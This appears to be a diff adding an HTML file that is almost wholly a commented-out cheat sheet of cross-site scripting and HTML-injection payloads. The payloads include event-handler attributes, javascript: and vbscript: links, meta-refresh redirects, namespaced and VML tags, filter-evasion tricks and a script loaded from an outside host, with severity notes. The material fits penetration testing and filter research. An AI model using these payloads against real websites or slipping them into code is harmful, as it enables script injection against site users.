@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<!--
+<h1>&mu;</h1>
+<L&mu; onclick=alert(1)>click me</L&mu;>
+<br>
+<l:&mu; onclick=alert(2)>click me again<L:&mu;>
+<br>
+<img/\/\&mu;/""src=x onerror=alert(3)//>
+<br>
+-->
+
+<!-- XSS=Medium | HTMLi=NONE 
+<input value="" type=image src=1 onerror=alert(11)//"type="hidden"
+name="foo" />
+<br>
+-->
+<!-- HTML injection= Low | XSS=Medium 
+<input type="text" value=""
+style=display:block;position:absolute;top:0;left:0;width:999em;height:999em;
+onmouseover=alert(4) a=""name="foo"/>
+-->
+<br>
+<!--  HTML Injection = Low | XSS= Medium
+<foo:shape onclick="alert(5)" xmlns:foo xmlns="urn:schemas-microsoft-com:vml" style="behavior:url(#default#vml);">Click</foo:shape>
+<br>
+<a:b:c xmlns:a xmlns:b onmouseover=alert(1)>Hover</a::b:c>
+<br>
+-->
+
+
+<!-- HTMLi = Low | XSS = Medium 
+</p><img src=x onerror=alert(6)>
+</br><img src=x onerror=alert(7)>
+-->
+
+
+<!--htmli = | xss= Medium 
+<img src=x onerror= alert(8)
+<div>foobar</div>
+<script src=http://0.x.1v</script>
+-->
+
+<!--
+<style>
+*[class="</style <img src=x onerror=alert(9)//"]{color:blue;}
+</style>
+-->
+
+<!--
+<img src="[iron.jpg]" onload="alert(10)">
+<iframe onload="alert(11)">
+-->
+
+<!--<body onblur=alert(1) onunload=alert(2) onbeforeunload=alert(3)> -->
+
+<!-- htmli=low | xss=low
+<body onscroll="alert(12)">
+<div style="height:10000px">Some Text</div>
+</body>
+-->
+
+<!--
+<bgsound onpropertychange=alert(1)>
+<body onpropertychange=alert(2)>
+<body onmove=alert(3)>
+<body onfocusin=alert(4)>
+<body onbeforeactivate=alert(5)>
+<body onactivate=alert(6)>
+<embed onmove=alert(7)>
+<object onerror=alert(8)>
+<style onreadystatechange=alert(9)>
+<xml onredystatechange=alert(10)>
+<xml onpropertychange=alert(11)>
+<table><td background=javascript:alert(12)>
+<a href="javascript:alert(1)">click me</a>
+<a href="vbscript:alert(2)">click me</a>
+<a href="javascript:'\x3cimg src\x3dx onerror=alert(document.domain)>'">click me</a>
+-->
+<!-- Dom based execution no -js
+<html>
+<body>
+<div id="test"></div>
+<script>alert(test)</script>
+-->
+<!-- href
+<meta http-equiv="refresh" content="0;
+url=javascript:alert(document.domain)">
+<meta http-equiv="refresh"
+content="0;
+url=data:text/html,<script>alert(document.domain)</script>">
+-->
+
+
+
+</body>
+</html>
+
+
